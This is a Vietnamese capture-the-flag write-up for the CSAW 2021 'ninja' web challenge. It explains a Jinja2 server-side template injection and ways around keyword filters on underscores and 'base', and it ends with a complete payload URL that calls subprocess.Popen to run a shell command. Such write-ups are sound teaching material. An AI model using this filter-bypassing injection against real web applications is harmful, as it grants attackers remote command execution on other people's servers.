# csaw21-ctf

## ninja

Đầu tiên, khi vào chúng ta có duy nhất một URL dẫn đến một Page. Page này cho phép ta nhập tên và render ra lời chào tới tên đó. Lỗ hổng dễ nhận ra đó là SSTI tương tự bài [Templated](https://ctf.d3s34.me/hackthebox/challenge/templated).&#x20;


![screenshot-from-2021-09-13-01-38-25.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1642602100131/M4VBc7cfP.png)

Cách exploit tương tự bài Templated ở trên tuy nhiên, chúng ta bị filter các keyword cho là nguy hiểm...

![screenshot-from-2021-09-11-11-28-20.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1642602135509/F7Z8R0KUy.png)

&#x20;Vậy là chúng ta bị filter `_` và `base`. Cần tìm được cách bypass được các filter này. Mình tìm được bài [này](https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f) và bài [này](https://0day.work/jinja2-template-injection-filter-bypasses/). Nên chúng ta có các quy tắc thay thế sau:&#x20;

* Sử dụng `attr()` để gọi các `attribute` của tham số.
* Các tham số được truyền thông qua `|` tương tự pipeline.
* Ký tự `_` được thay thế bằng `\x5f`
* Khi tham chiếu đến các phần tử thì sử dụng `__getitem()__` _thay cho `[ ]`_

Và do từ khóa `base` bị filter nên đương nhiên ta sẽ dùng qua MRO.


![screenshot-from-2021-09-11-11-25-24.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1642602148344/gSd1pU1s0.png)

Ở bài Templated thì mình có dùng slice để tìm được class `Popen` nhanh nhưng ở đây tìm phép thay thế có vẻ mất thời gian nên mình có học theo bài trên medium là dùng Python để tìm index bằng cơm :v

```python
file = open("lol.txt", "r")
    lst = file.read().split(",")
    for index, value in enumerate(lst):
        if value.find("Popen") != -1:
            print(index, value)
```

&#x20;Tìm được index rồi thì pass tham số vào thôi!

Payload đầy đủ sẽ như sau

```python
http://web.chal.csaw.io:5000/submit?value={""|attr("\x5f\x5fclass\x5f\x5f")|attr("\x5f\x5fmro\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")(2)|attr("\x5f\x5fsubclasses\x5f\x5f")()|attr("\x5f\x5fgetitem\x5f\x5f")(258)("cat flag.txt",shell=True,stdout=-1)|attr("communicate")()}}
```

![screenshot-from-2021-09-11-11-26-11.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1642602201633/wQQJXlkrD.png)
